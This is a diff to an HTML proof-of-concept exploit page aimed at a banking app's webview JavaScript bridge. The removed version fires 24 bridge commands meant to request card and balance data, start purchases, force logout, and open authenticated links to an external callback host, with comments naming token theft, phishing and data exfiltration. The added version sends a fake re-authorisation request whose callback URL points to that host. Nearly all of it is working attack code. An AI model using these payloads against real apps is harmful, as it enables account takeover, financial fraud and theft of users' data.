@@ -1,108 +1,20 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// CONFIRMED WORKING FORMAT: {"type":"...","trackId":"...","payload":{fields}}
-// OPEN_LINK with format 1 (payload wrapper) worked!
+// Test: NEED_AUTHORIZATION - triggers re-auth flow
+// If this works, the app will show a login/auth screen
+// callbackUrl might redirect to attacker after auth completes
 
-function send(msg) {
-  window.__plusSDKMobileCompat.onMessage(JSON.stringify(msg));
-}
+window.__plusSDKMobileCompat.onMessage(JSON.stringify({
+  type: "NEED_AUTHORIZATION",
+  trackId: "auth1",
+  payload: {
+    reason: "SESSION_EXPIRED",
+    callbackUrl: "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/auth-callback"
+  }
+}));
 
-var OAST = "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me";
-
-// ALL COMMANDS - from most critical to least
-var commands = [
-
-  // === CRITICAL: Financial/Auth ===
-
-  // 1. OPEN_LINK - open arbitrary URL with auth (CONFIRMED WORKING)
-  {type:"OPEN_LINK", trackId:"cmd1", payload:{url:OAST+"/cmd-OPEN_LINK", urlType:"WEBLINK", openType:"OUT", needAuth:true}},
-
-  // 2. OPEN_LINK with DEEPLINK type (trigger internal deeplinks)
-  {type:"OPEN_LINK", trackId:"cmd2", payload:{url:"yandexbank://screen.open/cards", urlType:"DEEPLINK", openType:"IN", needAuth:false}},
-
-  // 3. NEED_AUTHORIZATION - trigger re-auth flow (phishing vector)
-  {type:"NEED_AUTHORIZATION", trackId:"cmd3", payload:{reason:"SESSION_EXPIRED", callbackUrl:OAST+"/cmd-NEED_AUTH"}},
-
-  // 4. USER_CARDS_REQUEST - request user's card info
-  {type:"USER_CARDS_REQUEST", trackId:"cmd4", payload:{}},
-
-  // 5. OPEN_LOG_OUT_REQUEST - force logout (DoS)
-  {type:"OPEN_LOG_OUT_REQUEST", trackId:"cmd5", payload:{}},
-
-  // 6. PURCHASE_PRODUCT_REQUEST - initiate purchase
-  {type:"PURCHASE_PRODUCT_REQUEST", trackId:"cmd6", payload:{purchaseType:"SUBSCRIPTION", productId:"plus_trial", target:"self", forceSelectCard:false}},
-
-  // 7. CHANGE_OPTION_STATUS_REQUEST - change account options
-  {type:"CHANGE_OPTION_STATUS_REQUEST", trackId:"cmd7", payload:{optionId:"cashback", enabled:true}},
-
-  // 8. OPTION_STATUS_REQUEST - read account option status
-  {type:"OPTION_STATUS_REQUEST", trackId:"cmd8", payload:{optionId:"cashback"}},
-
-  // 9. BANK_STATE_REQUEST - request banking state/balance info
-  {type:"BANK_STATE_REQUEST", trackId:"cmd9", payload:{}},
-
-  // 10. GET_PRODUCTS_REQUEST - get available products
-  {type:"GET_PRODUCTS_REQUEST", trackId:"cmd10", payload:{}},
-
-  // === MEDIUM: Data Exfil/Manipulation ===
-
-  // 11. CALLBACK_EVENT - send callback with arbitrary data
-  {type:"CALLBACK_EVENT", trackId:"cmd11", payload:{callbackId:"exfil", data:OAST+"/cmd-CALLBACK"}},
-
-  // 12. OPEN_SMART - open another smart webview (chain attacks)
-  {type:"OPEN_SMART", trackId:"cmd12", payload:{url:OAST+"/cmd-OPEN_SMART", broadcastId:"attack"}},
-
-  // 13. OPEN_NATIVE_SHARING - open share sheet (data exfil via share)
-  {type:"OPEN_NATIVE_SHARING", trackId:"cmd13", payload:{text:"Stolen data here", mimeType:"text/plain"}},
-
-  // 14. SEND_BROADCAST_EVENT - broadcast to other app components
-  {type:"SEND_BROADCAST_EVENT", trackId:"cmd14", payload:{id:"attack", event:"inject", params:"{}"}},
-
-  // 15. USER_BOUGHT_SUBSCRIPTION - fake subscription purchase
-  {type:"USER_BOUGHT_SUBSCRIPTION", trackId:"cmd15", payload:{productId:"plus_annual"}},
-
-  // === LOW: UI/State Manipulation ===
-
-  // 16. NATIVE_VIBRATE_REQUEST - vibrate device
-  {type:"NATIVE_VIBRATE_REQUEST", trackId:"cmd16", payload:{vibrateType:"HEAVY"}},
-
-  // 17. CLOSE_CURRENT_WEBVIEW - close the webview
-  {type:"CLOSE_CURRENT_WEBVIEW", trackId:"cmd17", payload:{}},
-
-  // 18. READY - signal ready
-  {type:"READY", trackId:"cmd18", payload:{}},
-
-  // 19. READY_FOR_MESSAGES - signal ready for messaging
-  {type:"READY_FOR_MESSAGES", trackId:"cmd19", payload:{}},
-
-  // 20. CRITICAL_ERROR - show error to user
-  {type:"CRITICAL_ERROR", trackId:"cmd20", payload:{}},
-
-  // 21. SEND_METRICS - send fake analytics
-  {type:"SEND_METRICS", trackId:"cmd21", payload:{EventName:"attack_test", EventValue:"r4dl3"}},
-
-  // 22. SHOW_SERVICE_INFORMATION - show service info
-  {type:"SHOW_SERVICE_INFORMATION", trackId:"cmd22", payload:{message:"Hacked by r4dl3"}},
-
-  // 23. UPDATE_TARGETS_STATE - update targets
-  {type:"UPDATE_TARGETS_STATE", trackId:"cmd23", payload:{targets:[]}},
-
-  // 24. OPEN_LINK needAuth=true to external (steal auth token in redirect)
-  {type:"OPEN_LINK", trackId:"cmd24", payload:{url:OAST+"/cmd-OPEN_LINK_AUTH", urlType:"WEBLINK", openType:"OUT", needAuth:true}},
-];
-
-// Send all commands with small delays
-commands.forEach(function(cmd, i) {
-  setTimeout(function() {
-    send(cmd);
-  }, i * 200);
-});
-
-// Report
-setTimeout(function(){
-  fetch(OAST + "/all-commands-sent?count=" + commands.length);
-}, commands.length * 200 + 1000);
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/need-auth-sent");
 </script>
 </body>
 </html>
